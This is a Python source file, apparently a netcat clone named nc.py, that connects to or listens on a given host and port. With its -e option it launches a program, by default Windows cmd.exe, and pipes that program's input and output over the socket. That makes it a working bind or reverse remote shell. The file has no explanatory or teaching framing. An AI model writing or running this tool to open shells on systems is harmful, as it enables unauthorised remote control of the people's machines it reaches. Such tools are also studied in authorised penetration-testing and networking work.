import socket,os,threading,sys
import subprocess as sub

def usage():
    print("nc.py [target] [port] [-e destanation] {-h] [-l]")

if "-h" in sys.argv:
    usage()
    exit()

try:
    target = sys.argv[1]
    port = int(sys.argv[2])
except:
    usage()
    exit()

listen = ("-l" in sys.argv)

execute = False

if("-e" in sys.argv):
    execute = True
    try:
        program = sys.argv[sys.argv.index("-e")+1]
    except:
        program = ["\\windows\\system32\\cmd.exe"] 

def recieve_data(s, p):
    #recieves data from client server or shell
    global execute
    while True:
        data = ""
        while "\n" not in data:
             data = s.recv(1024).decode()
        if(execute):   
                p.stdin.write(data.encode())
                p.stdin.flush()
        else:
            print(data)

def send_data(s,p):
    #sends data to server/client
    global execute
    while True:
        if(execute):
            data = ""
            while "\n" not in data:
                data += p.stdout.read(1).decode()
            s.send(data.encode())
            
        else:
            
            s.send((input(">") + "\n").encode())


if(execute):
   shell = sub.Popen(program, stdin=sub.PIPE, stderr=sub.STDOUT, stdout=sub.PIPE)
else:
   shell = "none"

if(not listen):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
        s.connect((target,port))
    except Exception as e:
        s.close()
        print(e)
else:
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((target,port))
        print("Listening on {}".format((target,port)))
        server.listen(3)
        s, addr = server.accept()
        print("Got connection: {}".format(addr))
    except Exception as e:
        server.close()
        print(e)

#threads
thread1 = threading.Thread(target=recieve_data, args=(s,shell))
thread2 = threading.Thread(target=send_data, args=(s,shell))

thread1.start()
thread2.start()
